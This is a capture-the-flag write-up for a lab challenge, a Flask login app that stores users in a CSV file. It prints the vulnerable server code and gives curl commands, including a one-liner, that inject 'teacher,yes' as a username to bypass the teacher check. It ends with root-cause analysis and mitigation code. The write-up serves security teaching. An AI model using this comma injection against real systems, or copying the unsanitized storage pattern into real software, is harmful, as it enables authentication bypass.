## Challenge Overview

**Challenge:** Teacher's Login  
**Category:** CSV Injection / Input Validation  
**Goal:** Log in as the "teacher" by exploiting how the CSV-based database is parsed.

The server is a Flask application that:

1. **Stores users** in a CSV file (`/challenge/users.txt`) with the format `USERNAME,IS_TEACHER`
2. **Adds users** via `/add` — prepends `{username},no\n` to the file
3. **Logs in** via `/login` — parses each CSV line and returns the flag if `username` matches and `is_teacher` is `"yes"`

---

## Source Code Analysis

Here is the full server code:

```python
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import flask
import os

app = flask.Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
    for entry in open("/challenge/users.txt"):
        username,is_teacher,*_ = entry.strip().split(",")
        if username == flask.request.form.get("user"):
            if is_teacher.lower() == "yes":
                return f"<p>Logged in as a teacher! Here is your flag:<br/>{open('/flag').read()}</p>"
            else:
                return """Logged in ... but not as a teacher. <a href="/">Try again?</a>"""
    return """No such user... <a href="/">Try again?</a>"""

@app.route("/add", methods=["POST"])
def add():
    username = flask.request.form.get("user")
    user_database = f"{username},no\n" + open("/challenge/users.txt").read().strip()
    open("/challenge/users.txt", "w").write(user_database)
    return flask.redirect("/")

@app.route("/", methods=["GET"])
def index():
    return f"""
        <h1>The Login</h1>
        Welcome! Can you log in as teacher?
        <h2>The User Database</h2>
        <pre>
USERNAME,IS_TEACHER
{open("/challenge/users.txt").read()}
        </pre>
        <h2>Add a User</h2>
        <form action="add" method="post">
            Username: <input name="user">
            <input type=submit value="Add">
        </form>
        <h2>Login</h2>
        <form action="login" method="post">
            Username: <input name="user">
            <input type=submit value="Login">
        </form>
    """

open('/challenge/users.txt', 'w').close()

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

---

## Vulnerability Discovery

### The CSV Parsing Logic

The critical line in the login function:

```python
username,is_teacher,*_ = entry.strip().split(",")
```

This uses Python's tuple unpacking with `*_` to capture extra fields. It splits each CSV line by `,` and assigns:
- First element → `username`
- Second element → `is_teacher`
- Everything else → discarded (`*_`)

### The Add Endpoint's Weakness

The add endpoint does:

```python
user_database = f"{username},no\n" + open("/challenge/users.txt").read().strip()
```

It naively embeds the user-supplied `username` directly into the CSV template, appending `,no` after it. There is **no sanitization** of the username field — no filtering of commas, newlines, or any other characters.

---

## Exploit Strategy

Since the username is unsanitized, we can **inject a comma** into it. The plan:

1. Register a user with the username `teacher,yes`
2. The database entry becomes: `teacher,yes,no`
3. Log in with username `teacher`
4. The CSV parser splits `teacher,yes,no` into:
   - `username = "teacher"`
   - `is_teacher = "yes"`
   - `_ = ["no"]` (discarded)
5. The check `is_teacher.lower() == "yes"` passes, and the flag is returned

### Why Does This Work?

The add endpoint stores `{username},no`. If `username = "teacher,yes"`, the stored line becomes:

```
teacher,yes,no
```

The login parser splits this by `,` → `["teacher", "yes", "no"]`. The first value `"teacher"` matches the login form input, the second value `"yes"` passes the teacher check, and the leftover `"no"` is ignored by the `*_` catch-all.

---

## Step-by-Step Exploitation

### Step 1: SSH into the Challenge Server

connect to the ssh environment.

### Step 2: Start the Server

```bash
/challenge/server &
```

The server binds to `challenge.localhost:80` as root (SUID binary).

### Step 3: Add a User with an Injected Comma

```bash
curl -s -X POST -d "user=teacher,yes" http://challenge.localhost:80/add
```

This makes the server write `teacher,yes,no` into `/challenge/users.txt`.

### Step 4: Verify the Database Entry

```bash
cat /challenge/users.txt
```

Output:
```
teacher,yes,no
```

### Step 5: Log in as Teacher

```bash
curl -s -X POST -d "user=teacher" http://challenge.localhost:80/login
```

## One-Liner Exploit

```bash
curl -s -X POST -d "user=teacher,yes" http://challenge.localhost:80/add && \
curl -s -X POST -d "user=teacher" http://challenge.localhost:80/login
```

---

## Root Cause & Mitigation

### Root Cause

The vulnerability is a **CSV injection** caused by:

1. **No input sanitization** — the username is embedded directly into a CSV template without stripping commas or newlines
2. **Permissive CSV parsing** — the login parser uses `split(",")` followed by tuple unpacking, which silently discards extra fields instead of validating the expected structure

### Mitigation

To fix this, the server should:

1. **Sanitize the username** — strip or reject commas and newlines from the input
2. **Use strict CSV parsing** — validate that exactly 2 fields exist per line
3. **Use parameterized storage** — instead of text templating, use a proper structured format or at least escape special characters

Example fix for input sanitization:

```python
username = flask.request.form.get("user")
if "," in username or "\n" in username:
    return "Invalid username", 400
```

And for strict parsing:

```python
fields = entry.strip().split(",")
if len(fields) != 2:
    continue  # skip malformed entries
username, is_teacher = fields
```

---

## Key Takeaways

| Concept | Detail |
|---------|--------|
| **Challenge Type** | CSV Injection |
| **Vulnerability** | Unsanitized user input embedded in CSV format |
| **Exploit** | Comma injection in username field |
| **Impact** | Authentication bypass, unauthorized flag access |
| **Fix** | Input validation + strict CSV parsing |

- if you liked the content then make sure to check out the rest of the repos as well and star them ... Happy Hacking 
